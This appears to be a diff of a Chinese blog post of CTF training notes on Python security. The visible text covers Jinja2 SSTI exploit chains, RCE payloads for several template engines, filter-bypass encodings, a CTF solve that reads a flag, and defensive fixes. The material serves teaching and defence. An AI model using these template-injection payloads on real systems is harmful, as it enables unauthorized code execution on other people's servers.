@@ -1,6 +1,3 @@
-
-
-
 ---
 title: "Python 安全 CTF 培训：SSTI、反序列化与沙箱"
 description: "Python 安全培训笔记：SSTI、反序列化、沙箱逃逸等 CTF 常见题型与防御思路梳理。"
@@ -16,7 +13,6 @@ authors:
 draft: false
 slug: "summer-python-security"
 ---
-<meta name="referrer" content="no-referrer">
 
 # Python安全 - CTF新手培训
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753185347054-1afc5ddf-452f-426a-80af-251f43ffea3f.png)
@@ -36,8 +32,6 @@ slug: "summer-python-security"
 + 掌握 CTF 中出现频率较高的 Python 安全题型的解题思路；
 + 培养安全意识与防御思维，提升代码审计能力。
 
-
-
 ### 🛠️ 0. 环境准备与依赖安装
 > 为了更高效地参与本课程的学习与实战演练，请大家在课前完成以下环境准备和基础知识补充：
 >
@@ -51,8 +45,6 @@ slug: "summer-python-security"
 conda create -n pysec-ctf python=3.11 -y
 conda activate pysec-ctf
 ```
-
-
 
 或者是
 
@@ -71,10 +63,6 @@ pip install requests flask jinja2
 
 📌建议统一使用 Python 虚拟环境（如 `venv` 或 `virtualenv`）管理依赖。
 
-
-
-
-
 ### 小 demo
 为了更好理解整个流程，大家熟悉整个漏洞复现，漏洞利用，环境搭建的整个过程
 
@@ -87,8 +75,6 @@ pip install requests flask jinja2
 写了一个小小流程示例，没有具体代码分析，为的就是会利用，知道流程
 
 [CVE-2024-1561复现 - BX](https://www.bx33661.com/blog/CVE-2024-1561/)
-
-
 
 ## Python 应用
 ### Python 脚本演示
@@ -175,8 +161,6 @@ for i in USER:
 > 这部分重点看 SSTI 中演示
 >
 
-
-
 ### 高度动态的运行环境（Dynamic Execution）
 + 支持运行时执行字符串：`eval()`、`exec()`、`compile()`
 + 可以动态导入模块：`__import__('os')`
@@ -193,10 +177,6 @@ __import__('os').system('whoami')
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753179826202-db1db925-336b-488d-b6e5-8e6f7d417bd2.png)
 
-
-
-
-
 这里介绍一下 Python 的“危险函数”
 
 | 函数 | 功能 | 返回值 | 风险等级 | 常见于攻击场景 |
@@ -208,7 +188,6 @@ __import__('os').system('whoami')
 | `os.system()` | 执行系统命令（无回显） | 返回码 | 🔥🔥🔥 | Webshell、SSTI |
 | `subprocess.*()` | 执行系统命令（可捕获输出） | 输出/状态码 | 🔥🔥🔥🔥 | 高级RCE、文件读写、持久化 |
 | `input()`（Py2） | 动态输入执行 | 用户输入 | 🔥🔥 | Python2特有漏洞点 |
-
 
 #### 📌 1. eval(expr)
 + **功能：** 执行字符串表达式，并返回结果。
@@ -336,10 +315,6 @@ output = subprocess.check_output("whoami", shell=True)
 __import__('os').system('whoami')  # 被执行！
 ```
 
-
-
-
-
 ## 🏗️ SSTI 漏洞了解
 > “一次模板、一条语句、一条命令。”
 >
@@ -351,14 +326,10 @@ __import__('os').system('whoami')  # 被执行！
 | --- | --- | --- |
 | SSTI | **Server-Side Template Injection** | 用户输入被**直接拼接**到服务器模板代码中，未经转义或沙箱隔离，导致模板引擎**解析并执行**攻击者可控的表达式。 |
 
-
 + **本质**：模板→数据替换 的过程被逆转：  
 数据（用户可控）→ 模板语法 → 引擎解析 → **代码执行**（RCE）。
 
-
-
 ### 什么是模板，如何理解模板
-
 
 **模板**就是一段带有**占位符**的字符串，模板引擎会用实际数据替换这些占位符，然后生成最终的 HTML 页面或文本内容。
 
@@ -403,8 +374,6 @@ def index():
 <h1>Hello bx king</h1>
 ```
 
-
-
 **漏洞形成流程图**
 
 [文本绘图-展示漏洞成因](https://www.mermaidchart.com/play?utm_source=mermaid_js&utm_medium=editor_selection&utm_campaign=playground#pako:eNqrVkrOT0lVslJKL0osyFAIcYnJUwACx-jnU1Y869j-Yt_kp61LYxV0de1qnk1f8GJ_-7PdS2oUnKKfrVj4bO7-p3umPpvcFwvR4wRSpeAc_WzHpmfzJ4N0tu9ClqopSKzMyU9MsYXofbF-7bPNU2sUXKKf7F78fEHjs87lLxb26Ac5uwI1KdUCAGP0Scs)
@@ -419,9 +388,6 @@ def index():
 | PHP | Twig / Smarty | `{{7*7}}` / `{{$smarty}` | `{{_self.env.setCacheDir("/tmp")}}` |
 | Java | FreeMarker | `${7*7}` | `${"freemarker.template.utility.Execute"?new()("id")}` |
 | Node.js | Nunjucks / EJS | `<%= 7*7 %>` | `{{range.constructor("return process.mainModule.require('child_process').execSync('id')")()}}` |
-
-
-
 
 ### Jinja2 经典利用链（含命令执行）
 > 以 Python + Flask（Jinja2）为示例
@@ -453,11 +419,7 @@ RCE（Python3 链）
 | `.__builtins__.os` | 获得 os 模块 |
 | `popen` | ⇒ RCE |
 
-
-
-
 ### 漏洞检测
-
 
 漏洞检测
 
@@ -466,9 +428,6 @@ RCE（Python3 链）
 | 数学表达式 | `{{7*7}}` | 输出 `49` 或异常 |
 | 报错信息 | `{{7/0}}` | 泄露模板引擎类型、源码路径 |
 | 对象链 | `{{ ''.__class__ }}` | 返回 `<class 'str'>` 等 |
-
-
-
 
 #### 手段--手工
 常见姿势
@@ -497,8 +456,6 @@ Set-Cookie: session={{7*7}}
 User-Agent: {{7*7}}
 ```
 
-
-
 #### 自动化工具
 1. Fenjing（这个推荐大家多看看）
 
@@ -508,10 +465,6 @@ User-Agent: {{7*7}}
 + 支持对 GET、POST 请求的 fuzz 测试
 + 可自定义 payload 模板进行批量注入测试
 
-
-
-
-
 2. Tplmap
 
 [Github-Tplmap](https://github.com/epinna/tplmap)
@@ -520,17 +473,11 @@ User-Agent: {{7*7}}
 + 自动化识别模板引擎类型，并尝试执行命令
 + 可用于本地调试模板注入链路
 
-
-
 3.  BurpSuite 插件  
 
 结合 bp 自动化测试
 
-
-
 ....
-
-
 
 ### 防御与修复
 | 措施 | 示例 |
@@ -538,11 +485,8 @@ User-Agent: {{7*7}}
 | **沙箱 + 白名单** | Jinja2 `SandboxedEnvironment` |
 | **纯数据注入** | 用 `{{ user.name }}` 而非 `{{ user }}` |
 | **模板分隔符转义** | 替换 `{{`、`{%` 为 `{[{`、HTML entity |
-| **严格输出编码** | `{{ user.comment |
+| **严格输出编码** | `{{ user.comment \| escape }}` |
 | **禁止危险 globals** | 禁掉 `__builtins__`、`__import__`、`open` |
-
-
-
 
 ### 课堂演示
 > 一个 flask 随便起的例子
@@ -588,12 +532,6 @@ if __name__ == '__main__':
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753178460404-b95e2574-df9b-4aef-ad26-61ee3017fdcf.png)
 
-
-
-
-
-
-
 ### 实战演练靶场
 > 可以具体看一下
 >
@@ -606,8 +544,6 @@ if __name__ == '__main__':
 [**https://portswigger.net/web-security/all-topics**](https://portswigger.net/web-security/all-topics)
 
 5. Hack The Box - **「Jeeves」靶机**
-
-
 
 ## SSTI 深入学习
 ### Python 链子介绍
@@ -657,8 +593,6 @@ __bases__[0]
 {{()["\x5f\x5fclass\x5f\x5f"]}} ={{().__class__}}
 ```
 
-
-
 **赋值方法：**
 
 这个主要用于单双引号被ban的情况
@@ -667,8 +601,6 @@ __bases__[0]
 + `request.cookies.x`，=传递cookie参数
 + `request.values.x`，传递post参数
 
-
-
 **花括号{}被ban**：
 
 在jinjia引擎中可以使用`{%    %}`
@@ -676,8 +608,6 @@ __bases__[0]
 ```python
 {%print("".__.....)%}
 ```
-
-
 
 **编码**
 
@@ -714,8 +644,6 @@ def string_to_hex_with_slashes(s):
 print("Hex with slashes:", string_to_hex_with_slashes(normal_string))
 ```
 
-
-
 直接方法
 
 ```python
@@ -737,10 +665,6 @@ print("Hex with slashes:", string_to_hex_with_slashes(normal_string))
 ...
 
 还有很多很多
-
-
-
-
 
 ### 题目实战
 #### NSSCTF--[HNCTF 2022 WEEK2]ez_SSTI
@@ -787,27 +711,19 @@ if __name__ == "__main__":
     app.run(host='0.0.0.0', port=80)
 ```
 
-
-
 2. 利用工具--fenjing
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160076-ce84e70f-b33a-424a-8906-21f91f19bdc7.png)
-
-
 
 #### [安洵杯 2020]Normal SSTI
 1. 使用Fenjing
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160101-a588a080-3f7c-4a45-89ac-c99c1282479d.png)
 
-
-
 #### [HNCTF 2022 WEEK3]ssssti
 1. 使用使用Fenjing
 
 ![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1753188160235-59de95c9-1205-423e-8e36-0a205215062b.png)
-
-
 
 #### CTFSHOW----web361
 ##### 手工
@@ -869,8 +785,6 @@ posix-linux $ cat /flag
 ctfshow{82f81a13-a157-49a5-ba00-cb23de3238cb}
 ```
 
-
-
 ## 参考文章&学习资料
 + HelloCTF
 
@@ -880,11 +794,9 @@ ctfshow{82f81a13-a157-49a5-ba00-cb23de3238cb}
 
 [FLask SSTI从零到入门 - 跳跳糖](https://tttang.com/archive/1698/)
 
-+ 
++
 
 [Python新人学习-安全分析-第一部分 - BX](https://www.bx33661.com/blog/z8x9w23/)
-
-
 
 ## 其他知识
 这部分就是比较零碎的了
@@ -939,8 +851,6 @@ pyenv versions    # 查看已安装的所有版本
 pyenv version     # 当前正在使用的版本
 ```
 
-
-
 ### flask-session 伪造问题
 > 对于 flask 框架的深入
 >
@@ -949,14 +859,8 @@ pyenv version     # 当前正在使用的版本
 
 [GitHub - noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder](https://github.com/noraj/flask-session-cookie-manager)
 
-
-
-
-
 ### Python 内存马问题
 ...
-
-
 
 ### 📚 Python 安全内容
 本课程内容覆盖基础、漏洞原理、高级利用与 CTF 实战四大模块，具体包括：
@@ -1000,14 +904,4 @@ pyenv version     # 当前正在使用的版本
     - Python安全编码规范
     - 常用静态/动态审计工具（如 Bandit、pylint、pyre-check 等）
     - 安全开发生命周期与持续集成中的防御机制
-
-
-
-
-
-
-
-
-
-
 
